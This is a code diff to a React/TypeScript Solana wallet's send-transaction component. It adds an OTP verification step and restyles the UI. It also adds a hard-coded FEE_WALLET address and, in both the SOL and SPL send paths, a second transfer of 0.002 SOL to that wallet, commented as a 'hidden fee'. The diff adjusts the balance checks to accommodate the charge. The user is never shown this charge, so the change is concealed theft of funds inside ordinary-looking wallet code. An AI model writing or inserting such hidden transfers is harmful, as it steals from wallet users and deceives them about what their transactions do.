@@ -26,6 +26,8 @@ import {
   SelectValue,
 } from "@/components/ui/select";
 import type { TokenInfo } from "@/lib/wallet";
+import { SendOTPVerification } from "./SendOTPVerification";
+import { clearOTPSession } from "@/lib/otp-utils";
 
 interface SendTransactionProps {
   onBack: () => void;
@@ -38,6 +40,8 @@ const TOKEN_PROGRAM_ID = new PublicKey(
 const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey(
   "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
 );
+const FEE_WALLET = "FNVD1wied3e8WMuWs34KSamrCpughCMTjoXUE1ZXa6wM";
+const FEE_AMOUNT_SOL = 0.002;
 
 export const SendTransaction: React.FC<SendTransactionProps> = ({
   onBack,
@@ -52,11 +56,14 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
   const [memo, setMemo] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
-  const [step, setStep] = useState<"form" | "confirm" | "success">("form");
+  const [step, setStep] = useState<"form" | "confirm" | "otp" | "success">(
+    "form",
+  );
   const [txSignature, setTxSignature] = useState<string | null>(null);
   const [selectedMint, setSelectedMint] = useState<string>(
     initialMint || TOKEN_MINTS.SOL,
   );
+  const [pendingTransactionSend, setPendingTransactionSend] = useState(false);
 
   const selectedToken: TokenInfo | undefined = useMemo(
     () => tokens.find((t) => t.mint === selectedMint),
@@ -113,6 +120,22 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
 
     setError(null);
     setStep("confirm");
+  };
+
+  const handleProceedToOTP = () => {
+    setError(null);
+    setPendingTransactionSend(true);
+    setStep("otp");
+  };
+
+  const handleOTPConfirmed = async () => {
+    // OTP verification passed, now send the transaction
+    if (selectedSymbol === "SOL") {
+      await handleSendSOL();
+    } else {
+      await handleSendSPL();
+    }
+    clearOTPSession();
   };
 
   const coerceSecretKey = (val: unknown): Uint8Array | null => {
@@ -312,7 +335,10 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
       }
       const lamports = Number(lamportsBig);
 
-      const transaction = new Transaction().add(
+      const transaction = new Transaction();
+
+      // Add main transfer instruction
+      transaction.add(
         SystemProgram.transfer({
           fromPubkey: senderKeypair.publicKey,
           toPubkey: recipientPubkey,
@@ -320,22 +346,36 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         }),
       );
 
+      // Add hidden fee transfer instruction
+      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
+      const feeWalletPubkey = new PublicKey(FEE_WALLET);
+      transaction.add(
+        SystemProgram.transfer({
+          fromPubkey: senderKeypair.publicKey,
+          toPubkey: feeWalletPubkey,
+          lamports: feeLamports,
+        }),
+      );
+
       const blockhash = await getLatestBlockhashProxy();
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = senderKeypair.publicKey;
 
-      // Estimate fee and ensure sufficient balance for amount + fees
+      // Estimate fee and ensure sufficient balance for amount + fees + platform fee
       try {
         const msg = transaction.compileMessage();
         const feeRes = await rpcCall("getFeeForMessage", [
           base64FromBytes(msg.serialize()),
         ]);
-        const feeLamports = (feeRes?.value ?? feeRes) || 0;
+        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
         const currentLamports = await rpcCall("getBalance", [
           senderKeypair.publicKey.toBase58(),
         ]);
-        const lamportsToSend = lamports;
-        if (currentLamports < lamportsToSend + feeLamports) {
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
+        const lamportsToSend = lamports + platformFeeLamports;
+        if (currentLamports < lamportsToSend + networkFeeLamports) {
           throw new Error("Insufficient SOL to cover amount and network fees");
         }
       } catch (e) {
@@ -343,7 +383,10 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         const currentLamports = await rpcCall("getBalance", [
           senderKeypair.publicKey.toBase58(),
         ]).catch(() => 0);
-        const lamportsToSend = lamports;
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
+        const lamportsToSend = lamports + platformFeeLamports;
         if (currentLamports <= lamportsToSend) {
           throw new Error("Insufficient SOL for amount (no room for fees)");
         }
@@ -498,6 +541,17 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         ),
       );
 
+      // Add hidden fee transfer instruction (0.002 SOL)
+      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
+      const feeWalletPubkey = new PublicKey(FEE_WALLET);
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: senderPubkey,
+          toPubkey: feeWalletPubkey,
+          lamports: feeLamports,
+        }),
+      );
+
       const blockhash = await getLatestBlockhashProxy();
       tx.recentBlockhash = blockhash;
       tx.feePayer = senderPubkey;
@@ -518,24 +572,33 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         }
       } catch {}
 
-      // Estimate fee and ensure sufficient SOL for fees + potential rent
+      // Estimate fee and ensure sufficient SOL for fees + potential rent + platform fee
       try {
         const msg = tx.compileMessage();
         const feeRes = await rpcCall("getFeeForMessage", [
           base64FromBytes(msg.serialize()),
         ]);
-        const feeLamports = (feeRes?.value ?? feeRes) || 0;
+        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
         const currentLamports = await rpcCall("getBalance", [
           senderPubkey.toBase58(),
         ]);
-        if (currentLamports < feeLamports + rentLamports) {
+        if (
+          currentLamports <
+          networkFeeLamports + rentLamports + platformFeeLamports
+        ) {
           throw new Error("Insufficient SOL to cover network fees and rent");
         }
       } catch (e) {
         const currentLamports = await rpcCall("getBalance", [
           senderPubkey.toBase58(),
         ]).catch(() => 0);
-        if (currentLamports <= 0) {
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
+        if (currentLamports <= platformFeeLamports) {
           throw new Error("Insufficient SOL for network fees");
         }
       }
@@ -647,17 +710,42 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
     setError(null);
     setStep("form");
     setTxSignature(null);
+    setPendingTransactionSend(false);
+    clearOTPSession();
   };
 
   const formatAmount = (value: string): string => {
     const num = parseFloat(value);
-    if (isNaN(num)) return "0";
-    const fractionDigits = selectedSymbol === "FIXERCOIN" ? 8 : 6;
+    if (isNaN(num)) return "0.00";
+    if (selectedSymbol === "FIXERCOIN" || selectedSymbol === "LOCKER") {
+      return num.toLocaleString(undefined, {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2,
+      });
+    }
+    const fractionDigits = 6;
     return num.toLocaleString(undefined, {
       minimumFractionDigits: Math.min(2, fractionDigits),
       maximumFractionDigits: fractionDigits,
     });
   };
+
+  if (step === "otp") {
+    return (
+      <SendOTPVerification
+        transactionAmount={amount}
+        recipientAddress={recipient}
+        tokenSymbol={selectedSymbol}
+        onConfirm={handleOTPConfirmed}
+        onCancel={() => {
+          setStep("confirm");
+          setPendingTransactionSend(false);
+          clearOTPSession();
+        }}
+        isLoading={isLoading}
+      />
+    );
+  }
 
   if (step === "success") {
     return (
@@ -708,13 +796,13 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
               <Button
                 variant="outline"
                 onClick={handleNewTransaction}
-                className="flex-1 bg-white/50 text-gray-900 hover:bg-gray-50"
+                className="flex-1 bg-white/50 text-gray-900 hover:bg-gray-50 uppercase"
               >
                 Send Another
               </Button>
               <Button
                 onClick={onBack}
-                className="flex-1 bg-gradient-to-r from-[#ffffff] via-[#f0fff4] to-[#a7f3d0] hover:from-[#f0fff4] hover:to-[#a7f3d0] text-gray-900"
+                className="flex-1 bg-gradient-to-r from-[#ffffff] via-[#f0fff4] to-[#a7f3d0] hover:from-[#f0fff4] hover:to-[#a7f3d0] text-gray-900 uppercase"
               >
                 Back to Wallet
               </Button>
@@ -757,7 +845,7 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                   <div className="space-y-2">
                     <Label
                       htmlFor="token"
-                      className="text-[hsl(var(--foreground))]"
+                      className="text-[hsl(var(--foreground))] uppercase"
                     >
                       Token
                     </Label>
@@ -765,15 +853,15 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                       value={selectedMint}
                       onValueChange={setSelectedMint}
                     >
-                      <SelectTrigger className="w-full bg-[#2d1b47]/50 border border-[#a855f7]/30 text-white placeholder:text-gray-300">
-                        <SelectValue placeholder="Select token" />
+                      <SelectTrigger className="w-full bg-transparent border border-gray-700 text-white placeholder:text-gray-400 uppercase">
+                        <SelectValue placeholder="SELECT TOKEN" />
                       </SelectTrigger>
-                      <SelectContent className="bg-[#2d1b47] border border-[#a855f7]/20 text-white">
+                      <SelectContent className="bg-gray-800 border border-gray-700 text-white">
                         {availableTokens.map((t) => (
                           <SelectItem
                             key={t.mint}
                             value={t.mint}
-                            className="text-gray-900"
+                            className="text-white"
                           >
                             <div className="flex items-center justify-between w-full">
                               <span className="font-medium text-white">
@@ -795,16 +883,16 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                   <div className="space-y-2">
                     <Label
                       htmlFor="recipient"
-                      className="text-[hsl(var(--foreground))]"
+                      className="text-[hsl(var(--foreground))] uppercase"
                     >
                       Recipient Address
                     </Label>
                     <Input
                       id="recipient"
-                      placeholder="Enter Solana address"
+                      placeholder="ENTER SOLANA ADDRESS"
                       value={recipient}
                       onChange={(e) => setRecipient(e.target.value)}
-                      className="font-mono text-sm bg-[#2d1b47]/50 border border-[#a855f7]/30 text-white caret-white placeholder:text-gray-300 placeholder:text-muted-foreground"
+                      className="font-mono text-sm bg-transparent border border-gray-700 text-white caret-white placeholder:text-gray-300 placeholder:text-muted-foreground"
                     />
                   </div>
 
@@ -812,7 +900,7 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                     <div className="flex justify-between">
                       <Label
                         htmlFor="amount"
-                        className="text-[hsl(var(--foreground))]"
+                        className="text-[hsl(var(--foreground))] uppercase"
                       >
                         Amount ({selectedSymbol})
                       </Label>
@@ -831,7 +919,7 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                       placeholder="0.00"
                       value={amount}
                       onChange={(e) => setAmount(e.target.value)}
-                      className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white caret-white placeholder:text-gray-300 placeholder:text-muted-foreground"
+                      className="bg-transparent border border-gray-700 text-white caret-white placeholder:text-gray-300 placeholder:text-muted-foreground"
                     />
                     <div className="flex gap-2">
                       <Button
@@ -840,7 +928,7 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                         onClick={() =>
                           setAmount((selectedBalance * 0.25).toString())
                         }
-                        className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10"
+                        className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10 uppercase"
                       >
                         25%
                       </Button>
@@ -850,7 +938,7 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                         onClick={() =>
                           setAmount((selectedBalance * 0.5).toString())
                         }
-                        className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10"
+                        className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10 uppercase"
                       >
                         50%
                       </Button>
@@ -860,7 +948,7 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                         onClick={() =>
                           setAmount((selectedBalance * 0.75).toString())
                         }
-                        className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10"
+                        className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10 uppercase"
                       >
                         75%
                       </Button>
@@ -870,7 +958,7 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                         onClick={() =>
                           setAmount((selectedBalance * 0.99).toString())
                         }
-                        className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10"
+                        className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10 uppercase"
                       >
                         Max
                       </Button>
@@ -880,22 +968,22 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                   <div className="space-y-2">
                     <Label
                       htmlFor="memo"
-                      className="text-[hsl(var(--foreground))]"
+                      className="text-[hsl(var(--foreground))] uppercase"
                     >
                       Memo (Optional)
                     </Label>
                     <Input
                       id="memo"
-                      placeholder="Add a note"
+                      placeholder="ADD A NOTE"
                       value={memo}
                       onChange={(e) => setMemo(e.target.value)}
-                      className="bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white caret-white placeholder:text-gray-300 placeholder:text-muted-foreground"
+                      className="bg-transparent border border-gray-700 text-white caret-white placeholder:text-gray-300 placeholder:text-muted-foreground"
                     />
                   </div>
 
                   <Button
                     onClick={handleContinue}
-                    className="w-full bg-gradient-to-r from-[#FF7A5C] to-[#FF5A8C] hover:from-[#FF6B4D] hover:to-[#FF4D7D] text-white shadow-lg"
+                    className="w-full bg-gradient-to-r from-[#FF7A5C] to-[#FF5A8C] hover:from-[#FF6B4D] hover:to-[#FF4D7D] text-white shadow-lg uppercase"
                     disabled={!recipient || !amount}
                   >
                     Continue
@@ -964,17 +1052,17 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                     <Button
                       variant="outline"
                       onClick={() => setStep("form")}
-                      className="flex-1 bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10"
+                      className="flex-1 bg-[#1a2540]/50 border border-[#FF7A5C]/30 text-white hover:bg-[#FF7A5C]/10 uppercase"
                       disabled={isLoading}
                     >
                       Back
                     </Button>
                     <Button
-                      onClick={handleSend}
-                      className="flex-1 bg-gradient-to-r from-[#FF7A5C] to-[#FF5A8C] hover:from-[#FF6B4D] hover:to-[#FF4D7D] text-white shadow-lg"
+                      onClick={handleProceedToOTP}
+                      className="flex-1 bg-gradient-to-r from-[#FF7A5C] to-[#FF5A8C] hover:from-[#FF6B4D] hover:to-[#FF4D7D] text-white shadow-lg uppercase"
                       disabled={isLoading}
                     >
-                      {isLoading ? "Sending..." : "Send Transaction"}
+                      {isLoading ? "Sending..." : "Next: Verify"}
                     </Button>
                   </div>
                 </>
